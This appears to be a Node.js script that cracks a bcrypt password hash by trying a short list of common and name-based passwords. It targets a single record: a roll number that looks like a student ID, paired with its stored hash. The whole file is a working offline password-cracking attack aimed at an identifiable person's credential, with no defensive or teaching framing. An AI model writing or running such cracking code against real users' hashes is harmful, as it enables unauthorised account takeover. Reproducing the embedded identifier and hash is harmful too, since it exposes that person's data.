const bcrypt = require('bcrypt');
const users = [
  { roll_no: "451122733018", hash: "$2b$10$/dQIPKHskQ1cSmGpFDHVb.6DY97L4XAWVmLL0sQUtXIHuSjsmpPai" }
];

const commonPasswords = ["123456", "password", "qwerty", "kiran123", "mypassword"]; // extend as needed

async function crackPassword(user) {
  for (const pwd of commonPasswords) {
    const match = await bcrypt.compare(pwd, user.hash);
    if (match) {
      console.log(`Password for ${user.roll_no} is: ${pwd}`);
      return;
    }
  }
  console.log(`Password for ${user.roll_no} not found in common passwords list`);
}

(async () => {
  for (const user of users) {
    await crackPassword(user);
  }
})();
